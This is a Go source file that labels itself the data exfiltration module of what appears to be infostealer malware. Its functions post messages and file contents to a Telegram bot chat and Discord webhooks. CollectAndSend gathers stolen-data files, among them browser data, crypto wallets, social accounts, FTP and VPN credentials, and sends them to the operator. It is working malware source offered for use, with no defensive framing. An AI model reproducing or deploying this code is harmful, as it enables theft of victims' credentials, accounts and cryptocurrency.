// ============================================================
// exfil.go - Data Exfiltration Module
// ============================================================
package exfil

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"time"
)

var (
	botToken string
	chatID   string
)

// Init initializes the exfil module
func Init(token, chat string) {
	botToken = token
	chatID = chat
}

// SendTelegram sends a message via Telegram
func SendTelegram(message string) bool {
	if botToken == "" || chatID == "" {
		log.Println("⚠️ Telegram not configured")
		return false
	}
	
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
	
	payload := map[string]string{
		"chat_id":    chatID,
		"text":       message,
		"parse_mode": "HTML",
	}
	
	jsonData, err := json.Marshal(payload)
	if err != nil {
		log.Printf("❌ Failed to marshal Telegram payload: %v", err)
		return false
	}
	
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Printf("❌ Failed to send Telegram message: %v", err)
		return false
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != 200 {
		log.Printf("❌ Telegram returned status: %d", resp.StatusCode)
		return false
	}
	
	log.Printf("✅ Telegram message sent")
	return true
}

// SendDiscord sends a message via Discord
func SendDiscord(message string, webhook string) bool {
	if webhook == "" {
		log.Println("⚠️ Discord not configured")
		return false
	}
	
	payload := map[string]string{
		"content": message,
	}
	
	jsonData, err := json.Marshal(payload)
	if err != nil {
		log.Printf("❌ Failed to marshal Discord payload: %v", err)
		return false
	}
	
	resp, err := http.Post(webhook, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Printf("❌ Failed to send Discord message: %v", err)
		return false
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != 204 && resp.StatusCode != 200 {
		log.Printf("❌ Discord returned status: %d", resp.StatusCode)
		return false
	}
	
	log.Printf("✅ Discord message sent")
	return true
}

// SendFile sends a file via Telegram
func SendFile(filePath, caption string) bool {
	if botToken == "" || chatID == "" {
		log.Println("⚠️ Telegram not configured")
		return false
	}
	
	fileData, err := ioutil.ReadFile(filePath)
	if err != nil {
		log.Printf("❌ Failed to read file: %v", err)
		return false
	}
	
	log.Printf("📁 Sending file: %s (%d bytes)", filePath, len(fileData))
	
	// For simplicity, send as base64 encoded message
	// In production, use proper file upload via multipart/form-data
	
	message := fmt.Sprintf("📁 File: %s\nSize: %d bytes\n%s", 
		filePath, len(fileData), string(fileData))
	
	if len(message) > 4000 {
		message = fmt.Sprintf("📁 File: %s\nSize: %d bytes\n(truncated)", 
			filePath, len(fileData))
	}
	
	return SendTelegram(message)
}

// CollectAndSend collects all extracted data and sends it
func CollectAndSend() {
	log.Println("📤 Collecting and sending exfil data...")
	
	files := []string{
		"browser_data.json",
		"system_info.json",
		"wallets.json",
		"games.json",
		"socials.json",
		"common_files.json",
		"ftps.json",
		"vpns.json",
	}
	
	for _, file := range files {
		if _, err := os.Stat(file); err == nil {
			log.Printf("📁 Sending: %s", file)
			
			if data, err := ioutil.ReadFile(file); err == nil {
				if len(data) < 4000 {
					SendTelegram(fmt.Sprintf("📁 %s:\n%s", file, string(data)))
				} else {
					SendTelegram(fmt.Sprintf("📁 %s: %d bytes (sent as file)", file, len(data)))
					SendFile(file, "Extracted data")
				}
			}
			
			time.Sleep(1 * time.Second)
		}
	}
	
	summary := fmt.Sprintf("✅ Exfil Complete\nTime: %s", time.Now().Format("2006-01-02 15:04:05"))
	SendTelegram(summary)
	
	log.Println("✅ Exfil complete")
}